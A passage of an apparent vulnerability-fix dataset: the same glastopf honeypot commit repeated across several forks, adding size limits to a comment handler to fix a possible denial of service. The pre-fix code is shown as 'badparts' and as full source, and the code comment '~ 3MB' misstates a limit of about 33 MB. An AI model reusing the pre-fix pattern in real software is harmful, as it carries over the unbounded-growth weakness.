attack_event.source_addr[0]\n+\n+        comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n         with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n             try:\n                 comment = (parse_qs(attack_event.parsed_request.body)\n@@ -35,12 +41,21 @@ def handle(self, attack_event):\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","files":{"\/glastopf\/modules\/handlers\/emulators\/comments.py":{"changes":[{"diff":"\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","add":14,"remove":5,"filename":"\/glastopf\/modules\/handlers\/emulators\/comments.py","badparts":["                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:","                    comments_txt.write(clean_comment)","                profiler.Profiler.add_comment(ip_address, comment)","            comments_file = os.path.join(self.data_dir, 'comments.txt')","                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:"],"goodparts":["                if os.path.isfile(comments_file):","                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:","                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:","                            comments_txt.write('')","                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:","                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:","                        comments_txt.write(clean_comment)","                    profiler.Profiler.add_comment(ip_address, comment)","                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:"]}],"source":"\nimport os from random import choice import codecs from urlparse import parse_qs from string import Template import cgi from glastopf.modules.handlers import base_emulator import glastopf.modules.processing.profiler as profiler class CommentPoster(base_emulator.BaseEmulator): def __init__(self, data_dir): super(CommentPoster, self).__init__(data_dir) def html_escape(self, comment): return cgi.escape(comment) def handle(self, attack_event): pages_path=os.path.join(self.data_dir, 'dork_pages') dork_page_list=os.listdir(pages_path) if '.git' in dork_page_list: dork_page_list.remove('.git') dork_page=choice(dork_page_list) ip_address=attack_event.source_addr[0] with codecs.open(os.path.join(pages_path, dork_page)) as dork_page: try: comment=(parse_qs(attack_event.parsed_request.body) ['comment'][0]) clean_comment=self.html_escape(comment) clean_comment=\"<br\/><br\/>\" +clean_comment comment=\"<br\/><br\/>\" +comment except KeyError: comment=\"\" clean_comment=\"\" else: with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt: comments_txt.write(clean_comment) profiler.Profiler.add_comment(ip_address, comment) comments_file=os.path.join(self.data_dir, 'comments.txt') if os.path.isfile(comments_file): with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt: general_comments=comments_txt.read() else: general_comments='' ip_comments=profiler.Profiler.get_comments(ip_address) display_comments=str(ip_comments) +str(general_comments) template=Template(dork_page.read()) attack_event.response=template.safe_substitute( login_msg=\"\", comments=display_comments) ","sourceWithComments":"import os\nfrom random import choice\nimport codecs\nfrom urlparse import parse_qs\nfrom string import Template\nimport cgi\nfrom glastopf.modules.handlers import base_emulator\n\nimport glastopf.modules.processing.profiler as profiler\n\n\nclass CommentPoster(base_emulator.BaseEmulator):\n    def __init__(self, data_dir):\n        super(CommentPoster, self).__init__(data_dir)\n\n    def html_escape(self, comment):\n        return cgi.escape(comment)\n\n    def handle(self, attack_event):\n        # TODO: Use the unknown emulators _get_template function.\n        pages_path = os.path.join(self.data_dir, 'dork_pages')\n        dork_page_list = os.listdir(pages_path)\n        if '.git' in dork_page_list:\n            dork_page_list.remove('.git')\n        dork_page = choice(dork_page_list)\n        ip_address = attack_event.source_addr[0]\n        with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n            try:\n                comment = (parse_qs(attack_event.parsed_request.body)\n                           ['comment'][0])\n                clean_comment = self.html_escape(comment)\n                clean_comment = \"<br\/><br\/>\" + clean_comment\n                comment = \"<br\/><br\/>\" + comment\n            except KeyError:\n                comment = \"\"\n                clean_comment = \"\"\n            else:\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n                    comments_txt.write(clean_comment)\n                profiler.Profiler.add_comment(ip_address, comment)\n            comments_file = os.path.join(self.data_dir, 'comments.txt')\n            if os.path.isfile(comments_file):\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n                    general_comments = comments_txt.read()\n            else:\n                general_comments = ''\n\n            ip_comments = profiler.Profiler.get_comments(ip_address)\n            display_comments = str(ip_comments) + str(general_comments)\n            template = Template(dork_page.read())\n            attack_event.response = template.safe_substitute(\n                login_msg=\"\",\n                comments=display_comments)\n"}},"msg":"Improved comments handler to fix possible Denial of Service vulnerability"}},"https:\/\/github.com\/Jorggio\/mush":{"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34":{"url":"https:\/\/api.github.com\/repos\/Jorggio\/mush\/commits\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","html_url":"https:\/\/github.com\/Jorggio\/mush\/commit\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","message":"Improved comments handler to fix possible Denial of Service vulnerability","sha":"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","keyword":"denial of service improve","diff":"diff --git a\/glastopf\/modules\/handlers\/emulators\/comments.py b\/glastopf\/modules\/handlers\/emulators\/comments.py\nindex db7ed6b..bac1b99 100644\n--- a\/glastopf\/modules\/handlers\/emulators\/comments.py\n+++ b\/glastopf\/modules\/handlers\/emulators\/comments.py\n@@ -10,6 +10,9 @@\n \n \n class CommentPoster(base_emulator.BaseEmulator):\n+    MAX_COMMENT_LEN = 2048\n+    MAX_FILE_LEN = 33816700  # ~ 3MB\n+\n     def __init__(self, data_dir):\n         super(CommentPoster, self).__init__(data_dir)\n \n@@ -24,6 +27,9 @@ def handle(self, attack_event):\n             dork_page_list.remove('.git')\n         dork_page = choice(dork_page_list)\n         ip_address = attack_event.source_addr[0]\n+\n+        comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n         with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n             try:\n                 comment = (parse_qs(attack_event.parsed_request.body)\n@@ -35,12 +41,21 @@ def handle(self, attack_event):\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","files":{"\/glastopf\/modules\/handlers\/emulators\/comments.py":{"changes":[{"diff":"\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","add":14,"remove":5,"filename":"\/glastopf\/modules\/handlers\/emulators\/comments.py","badparts":["                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:","                    comments_txt.write(clean_comment)","                profiler.Profiler.add_comment(ip_address, comment)","            comments_file = os.path.join(self.data_dir, 'comments.txt')","                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:"],"goodparts":["                if os.path.isfile(comments_file):","                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:","                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:","                            comments_txt.write('')","                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:","                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:","                        comments_txt.write(clean_comment)","                    profiler.Profiler.add_comment(ip_address, comment)","                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:"]}],"source":"\nimport os from random import choice import codecs from urlparse import parse_qs from string import Template import cgi from glastopf.modules.handlers import base_emulator import glastopf.modules.processing.profiler as profiler class CommentPoster(base_emulator.BaseEmulator): def __init__(self, data_dir): super(CommentPoster, self).__init__(data_dir) def html_escape(self, comment): return cgi.escape(comment) def handle(self, attack_event): pages_path=os.path.join(self.data_dir, 'dork_pages') dork_page_list=os.listdir(pages_path) if '.git' in dork_page_list: dork_page_list.remove('.git') dork_page=choice(dork_page_list) ip_address=attack_event.source_addr[0] with codecs.open(os.path.join(pages_path, dork_page)) as dork_page: try: comment=(parse_qs(attack_event.parsed_request.body) ['comment'][0]) clean_comment=self.html_escape(comment) clean_comment=\"<br\/><br\/>\" +clean_comment comment=\"<br\/><br\/>\" +comment except KeyError: comment=\"\" clean_comment=\"\" else: with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt: comments_txt.write(clean_comment) profiler.Profiler.add_comment(ip_address, comment) comments_file=os.path.join(self.data_dir, 'comments.txt') if os.path.isfile(comments_file): with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt: general_comments=comments_txt.read() else: general_comments='' ip_comments=profiler.Profiler.get_comments(ip_address) display_comments=str(ip_comments) +str(general_comments) template=Template(dork_page.read()) attack_event.response=template.safe_substitute( login_msg=\"\", comments=display_comments) ","sourceWithComments":"import os\nfrom random import choice\nimport codecs\nfrom urlparse import parse_qs\nfrom string import Template\nimport cgi\nfrom glastopf.modules.handlers import base_emulator\n\nimport glastopf.modules.processing.profiler as profiler\n\n\nclass CommentPoster(base_emulator.BaseEmulator):\n    def __init__(self, data_dir):\n        super(CommentPoster, self).__init__(data_dir)\n\n    def html_escape(self, comment):\n        return cgi.escape(comment)\n\n    def handle(self, attack_event):\n        # TODO: Use the unknown emulators _get_template function.\n        pages_path = os.path.join(self.data_dir, 'dork_pages')\n        dork_page_list = os.listdir(pages_path)\n        if '.git' in dork_page_list:\n            dork_page_list.remove('.git')\n        dork_page = choice(dork_page_list)\n        ip_address = attack_event.source_addr[0]\n        with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n            try:\n                comment = (parse_qs(attack_event.parsed_request.body)\n                           ['comment'][0])\n                clean_comment = self.html_escape(comment)\n                clean_comment = \"<br\/><br\/>\" + clean_comment\n                comment = \"<br\/><br\/>\" + comment\n            except KeyError:\n                comment = \"\"\n                clean_comment = \"\"\n            else:\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n                    comments_txt.write(clean_comment)\n                profiler.Profiler.add_comment(ip_address, comment)\n            comments_file = os.path.join(self.data_dir, 'comments.txt')\n            if os.path.isfile(comments_file):\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n                    general_comments = comments_txt.read()\n            else:\n                general_comments = ''\n\n            ip_comments = profiler.Profiler.get_comments(ip_address)\n            display_comments = str(ip_comments) + str(general_comments)\n            template = Template(dork_page.read())\n            attack_event.response = template.safe_substitute(\n                login_msg=\"\",\n                comments=display_comments)\n"}},"msg":"Improved comments handler to fix possible Denial of Service vulnerability"}},"https:\/\/github.com\/mushorg\/glastopf":{"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34":{"url":"https:\/\/api.github.com\/repos\/mushorg\/glastopf\/commits\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","html_url":"https:\/\/github.com\/mushorg\/glastopf\/commit\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","message":"Improved comments handler to fix possible Denial of Service vulnerability","sha":"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","keyword":"denial of service improve","diff":"diff --git a\/glastopf\/modules\/handlers\/emulators\/comments.py b\/glastopf\/modules\/handlers\/emulators\/comments.py\nindex db7ed6bb..bac1b995 100644\n--- a\/glastopf\/modules\/handlers\/emulators\/comments.py\n+++ b\/glastopf\/modules\/handlers\/emulators\/comments.py\n@@ -10,6 +10,9 @@\n \n \n class CommentPoster(base_emulator.BaseEmulator):\n+    MAX_COMMENT_LEN = 2048\n+    MAX_FILE_LEN = 33816700  # ~ 3MB\n+\n     def __init__(self, data_dir):\n         super(CommentPoster, self).__init__(data_dir)\n \n@@ -24,6 +27,9 @@ def handle(self, attack_event):\n             dork_page_list.remove('.git')\n         dork_page = choice(dork_page_list)\n         ip_address = attack_event.source_addr[0]\n+\n+        comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n         with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n             try:\n                 comment = (parse_qs(attack_event.parsed_request.body)\n@@ -35,12 +41,21 @@ def handle(self, attack_event):\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","files":{"\/glastopf\/modules\/handlers\/emulators\/comments.py":{"changes":[{"diff":"\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","add":14,"remove":5,"filename":"\/glastopf\/modules\/handlers\/emulators\/comments.py","badparts":["                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:","                    comments_txt.write(clean_comment)","                profiler.Profiler.add_comment(ip_address, comment)","            comments_file = os.path.join(self.data_dir, 'comments.txt')","                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:"],"goodparts":["                if os.path.isfile(comments_file):","                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:","                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:","                            comments_txt.write('')","                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:","                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:","                        comments_txt.write(clean_comment)","                    profiler.Profiler.add_comment(ip_address, comment)","                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:"]}],"source":"\nimport os from random import choice import codecs from urlparse import parse_qs from string import Template import cgi from glastopf.modules.handlers import base_emulator import glastopf.modules.processing.profiler as profiler class CommentPoster(base_emulator.BaseEmulator): def __init__(self, data_dir): super(CommentPoster, self).__init__(data_dir) def html_escape(self, comment): return cgi.escape(comment) def handle(self, attack_event): pages_path=os.path.join(self.data_dir, 'dork_pages') dork_page_list=os.listdir(pages_path) if '.git' in dork_page_list: dork_page_list.remove('.git') dork_page=choice(dork_page_list) ip_address=attack_event.source_addr[0] with codecs.open(os.path.join(pages_path, dork_page)) as dork_page: try: comment=(parse_qs(attack_event.parsed_request.body) ['comment'][0]) clean_comment=self.html_escape(comment) clean_comment=\"<br\/><br\/>\" +clean_comment comment=\"<br\/><br\/>\" +comment except KeyError: comment=\"\" clean_comment=\"\" else: with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt: comments_txt.write(clean_comment) profiler.Profiler.add_comment(ip_address, comment) comments_file=os.path.join(self.data_dir, 'comments.txt') if os.path.isfile(comments_file): with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt: general_comments=comments_txt.read() else: general_comments='' ip_comments=profiler.Profiler.get_comments(ip_address) display_comments=str(ip_comments) +str(general_comments) template=Template(dork_page.read()) attack_event.response=template.safe_substitute( login_msg=\"\", comments=display_comments) ","sourceWithComments":"import os\nfrom random import choice\nimport codecs\nfrom urlparse import parse_qs\nfrom string import Template\nimport cgi\nfrom glastopf.modules.handlers import base_emulator\n\nimport glastopf.modules.processing.profiler as profiler\n\n\nclass CommentPoster(base_emulator.BaseEmulator):\n    def __init__(self, data_dir):\n        super(CommentPoster, self).__init__(data_dir)\n\n    def html_escape(self, comment):\n        return cgi.escape(comment)\n\n    def handle(self, attack_event):\n        # TODO: Use the unknown emulators _get_template function.\n        pages_path = os.path.join(self.data_dir, 'dork_pages')\n        dork_page_list = os.listdir(pages_path)\n        if '.git' in dork_page_list:\n            dork_page_list.remove('.git')\n        dork_page = choice(dork_page_list)\n        ip_address = attack_event.source_addr[0]\n        with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n            try:\n                comment = (parse_qs(attack_event.parsed_request.body)\n                           ['comment'][0])\n                clean_comment = self.html_escape(comment)\n                clean_comment = \"<br\/><br\/>\" + clean_comment\n                comment = \"<br\/><br\/>\" + comment\n            except KeyError:\n                comment = \"\"\n                clean_comment = \"\"\n            else:\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n                    comments_txt.write(clean_comment)\n                profiler.Profiler.add_comment(ip_address, comment)\n            comments_file = os.path.join(self.data_dir, 'comments.txt')\n            if os.path.isfile(comments_file):\n                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n                    general_comments = comments_txt.read()\n            else:\n                general_comments = ''\n\n            ip_comments = profiler.Profiler.get_comments(ip_address)\n            display_comments = str(ip_comments) + str(general_comments)\n            template = Template(dork_page.read())\n            attack_event.response = template.safe_substitute(\n                login_msg=\"\",\n                comments=display_comments)\n"}},"msg":"Improved comments handler to fix possible Denial of Service vulnerability"}},"https:\/\/github.com\/li282886931\/glastopf":{"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34":{"url":"https:\/\/api.github.com\/repos\/li282886931\/glastopf\/commits\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","html_url":"https:\/\/github.com\/li282886931\/glastopf\/commit\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","message":"Improved comments handler to fix possible Denial of Service vulnerability","sha":"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","keyword":"denial of service improve","diff":"diff --git a\/glastopf\/modules\/handlers\/emulators\/comments.py b\/glastopf\/modules\/handlers\/emulators\/comments.py\nindex db7ed6b..bac1b99 100644\n--- a\/glastopf\/modules\/handlers\/emulators\/comments.py\n+++ b\/glastopf\/modules\/handlers\/emulators\/comments.py\n@@ -10,6 +10,9 @@\n \n \n class CommentPoster(base_emulator.BaseEmulator):\n+    MAX_COMMENT_LEN = 2048\n+    MAX_FILE_LEN = 33816700  # ~ 3MB\n+\n     def __init__(self, data_dir):\n         super(CommentPoster, self).__init__(data_dir)\n \n@@ -24,6 +27,9 @@ def handle(self, attack_event):\n             dork_page_list.remove('.git')\n         dork_page = choice(dork_page_list)\n         ip_address = attack_event.source_addr[0]\n+\n+        comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n         with codecs.open(os.path.join(pages_path, dork_page)) as dork_page:\n             try:\n                 comment = (parse_qs(attack_event.parsed_request.body)\n@@ -35,12 +41,21 @@ def handle(self, attack_event):\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","files":{"\/glastopf\/modules\/handlers\/emulators\/comments.py":{"changes":[{"diff":"\n                 comment = \"\"\n                 clean_comment = \"\"\n             else:\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:\n-                    comments_txt.write(clean_comment)\n-                profiler.Profiler.add_comment(ip_address, comment)\n-            comments_file = os.path.join(self.data_dir, 'comments.txt')\n+\n+                # overwrite the comments file if its size exceeds the max length\n+                if os.path.isfile(comments_file):\n+                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:\n+                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:\n+                            comments_txt.write('')\n+\n+                # store the comment only if its size does not exceed the max length\n+                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:\n+                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:\n+                        comments_txt.write(clean_comment)\n+                    profiler.Profiler.add_comment(ip_address, comment)\n+\n             if os.path.isfile(comments_file):\n-                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:\n+                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:\n                     general_comments = comments_txt.read()\n             else:\n                 general_comments = ''\n","add":14,"remove":5,"filename":"\/glastopf\/modules\/handlers\/emulators\/comments.py","badparts":["                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt:","                    comments_txt.write(clean_comment)","                profiler.Profiler.add_comment(ip_address, comment)","            comments_file = os.path.join(self.data_dir, 'comments.txt')","                with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt:"],"goodparts":["                if os.path.isfile(comments_file):","                    if os.stat(comments_file).st_size > CommentPoster.MAX_FILE_LEN:","                        with codecs.open(comments_file, \"w\", \"utf-8\") as comments_txt:","                            comments_txt.write('')","                if len(clean_comment) <= CommentPoster.MAX_COMMENT_LEN:","                    with codecs.open(comments_file, \"a\", \"utf-8\") as comments_txt:","                        comments_txt.write(clean_comment)","                    profiler.Profiler.add_comment(ip_address, comment)","                with codecs.open(comments_file, \"r\", \"utf-8\") as comments_txt:"]}],"source":"\nimport os from random import choice import codecs from urlparse import parse_qs from string import Template import cgi from glastopf.modules.handlers import base_emulator import glastopf.modules.processing.profiler as profiler class CommentPoster(base_emulator.BaseEmulator): def __init__(self, data_dir): super(CommentPoster, self).__init__(data_dir) def html_escape(self, comment): return cgi.escape(comment) def handle(self, attack_event): pages_path=os.path.join(self.data_dir, 'dork_pages') dork_page_list=os.listdir(pages_path) if '.git' in dork_page_list: dork_page_list.remove('.git') dork_page=choice(dork_page_list) ip_address=attack_event.source_addr[0] with codecs.open(os.path.join(pages_path, dork_page)) as dork_page: try: comment=(parse_qs(attack_event.parsed_request.body) ['comment'][0]) clean_comment=self.html_escape(comment) clean_comment=\"<br\/><br\/>\" +clean_comment comment=\"<br\/><br\/>\" +comment except KeyError: comment=\"\" clean_comment=\"\" else: with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"a\", \"utf-8\") as comments_txt: comments_txt.write(clean_comment) profiler.Profiler.add_comment(ip_address, comment) comments_file=os.path.join(self.data_dir, 'comments.txt') if os.path.isfile(comments_file): with codecs.open(os.path.join(self.data_dir, 'comments.txt'), \"r\", \"utf-8\") as comments_txt: general_comments=comments_txt.read() else: general_comments='' ip_comments=profiler.Profiler.get_comments(ip_address) display_comments=str(ip_comments) +str(general_comments) template=Template(dork_page.read()) attack_event.response=template.safe_substitute( login_msg=\"\", comments=display_comments) ","sourceWithComments":"import os\nfrom random import choice\nimport codecs\nfrom urlparse import parse_qs\nfrom string import Template\nimport cgi\nfrom glastopf.modules.handlers import base_emulator\n\nimport glastopf.modules.processing.profiler as profiler\n\n\nclass CommentPoster(base_emulator.BaseEmulator):\n    def __init__(self, data_dir):\n        super(CommentPoster, self).__init__(data_dir)\n\n    def html_escape(self, comment):\n        return cgi.escape(comment)\n\n    def handle(self, attack_event):\n        # TODO: Use the unknown emulators _get_template function.\n        pages_path = os.path.join(self.data_dir, 'dork_pages')\n        dork_page_list = os.listdir(pages_path)\n        if '.git' in dork_page_list:\n            dork_page_list.remove('.git')\n        dork_page = choice(dork_page_list)\n      